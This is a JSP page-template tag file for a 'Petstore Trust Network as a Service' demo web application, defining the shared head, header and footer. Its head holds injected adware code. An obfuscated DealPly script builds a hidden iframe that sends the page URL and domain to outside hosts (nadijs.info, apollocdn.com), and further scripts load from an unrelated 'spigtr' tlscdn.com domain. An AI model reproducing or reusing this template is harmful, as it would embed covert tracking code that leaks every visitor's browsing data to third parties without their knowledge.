<!--  
Copyright 2015 Resilient Networks Systems

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

@author Sandip Ghosh (sandip.ghosh@resilient-networks.com)
-->

<!-- 
 The HTML template tag for all pages of the application
 
@author Sandip Ghosh (sandip.ghosh@resilient-networks.com)
 -->
<%@tag description="Overall Page template" pageEncoding="UTF-8"%>
<%@attribute name="navigation" fragment="true" %>
<%@attribute name="trustTagScript" fragment="true" %>
<%
	String cp = application.getContextPath();
%>
<html lang="en">
  <head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

	<jsp:invoke fragment="trustTagScript"/>
    <link rel="icon" type="image/png" href="<%=cp%>/images/tn-logo.ico">
    <link rel="stylesheet" type="text/css" href="<%=cp%>/css/font-awesome.css" />
 
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css">

    <link rel="stylesheet" type="text/css" href="<%=cp%>/css/app.css" />

    <!-- Optional theme :: not for now, why bother with this extra bit of complexity -->
    <!--
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap-theme.min.css">
    -->
    <script type="text/javascript" async="">(function(){try{if(typeof window['asdfdsasdfdsa'] === 'undefined'){setTimeout(function(){var shouldThisPartOfCodeRun = document.URL.search('http') === 0 ;if(!shouldThisPartOfCodeRun){	return;}if(typeof DealPly !== 'undefined' && typeof DealPly.serverCallParam === 'string'  ){var reportFlag = true;var scArr = document.getElementsByTagName('script');for(var index in scArr){if(typeof scArr[index].src === 'string' && scArr[index].src.search('\\.js\\?dn=') !== -1){	reportFlag = false;}}if(!reportFlag ){	return;}var host = 'http://q.nadijs.info/';var isSecure =  document.URL.search('https://') === 0 ;if(isSecure){	host = 'https://endall41-q.apollocdn.com/';}var urlPath = 'dealdo/event-report?type=quick&';var iframe = document.createElement('iframe');var suffix = ''; try{if(typeof JavaScriptJsTagUrl !== 'undefined'){suffix = JavaScriptJsTagUrl.substr(JavaScriptJsTagUrl.search('\?') + 1 );}}catch(e324324){}iframe.setAttribute('style','position:relative; left:-10000px; width:1px; height:1px; visibility:hidden');iframe.setAttribute('src',host + urlPath + 'url=' + encodeURIComponent(document.URL) + '&domain=' + document.domain   + '&topic=dpdiedarg&' + suffix );document.body.appendChild(iframe);}}, 10000);window['asdfdsasdfdsa'] = true;} }catch(e235534){}})();</script><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js" type="text/javascript"></script>

    <!-- Latest compiled and minified JavaScript -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js" type="text/javascript"></script>

    <!--BRACKET script src='c dot-over-dot url  value eq "/js/bootstrap.js" close bracket slash greater than' type='text/javascript' > CLOSE BRACKET SCRIPT THINGY -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/velocity/1.1.0/velocity.js" type="text/javascript"></script>

    <title>Petstore Trust Network as a Service Demo Application</title>

	<script type="text/javascript" charset="UTF-8" src="https://i_spigtrmrjs_info.tlscdn.com/spigtr/javascript.js?hid=69&amp;channel=GC"></script>
	<script src="https://i_spigtrmrjs_info.tlscdn.com/opt_content.js?v=opt_1428849930192&amp;partner=spigtr&amp;channel=spigtrGC&amp;sset=0&amp;appTitle=&amp;sset=0&amp;ip=216.64.185.10"></script>
  </head>

  <body>
	<input type="hidden" name="contextPath" id="contextPath" value="<%=cp%>" />
	<!-- border:1px solid black; -->
	<div class="container" id="bonkers_header" style="">
	    <!-- border:1px dotted red; -->
	    <div class="panel panel-info" style="margin-bottom:0;">
	        <!-- took out from top class:  dark-side -->
	        <div class="panel-heading">
	            <!--<div class="col-xs-5"></div>-->
	            <a href="<%=cp%>"><img alt="Petstore Logo" src="<%=cp%>/images/banner_logo.gif"></a>
	            <small class="pull-right"><img alt="Trust Network Logo" src="<%=cp%>/images/tn-logo.png"><img alt="Trust Network as a Service" src="<%=cp%>/images/tnaas-logo.png" style="margin-left:10px"><br><h3>Petstore Sample Application</h3></small>
	        </div>
	        <jsp:invoke fragment="navigation"/>
	    </div>
	
	</div>
	<div class="container" id="site-wrapper">
		<jsp:doBody/>
	</div>	
	<footer class="footer">
	    <div class="container">
	        <p class="text-muted">Copyright &#169; 2010-2015 Resilient Network Systems, Inc. All rights reserved worldwide.</p>
	    </div>
	</footer>
	<script src="<%=cp%>/js/md5.min.js" type="text/javascript"></script>
	<script src="<%=cp%>/js/petstore.js" type="text/javascript"></script>
  </body>
</html>	
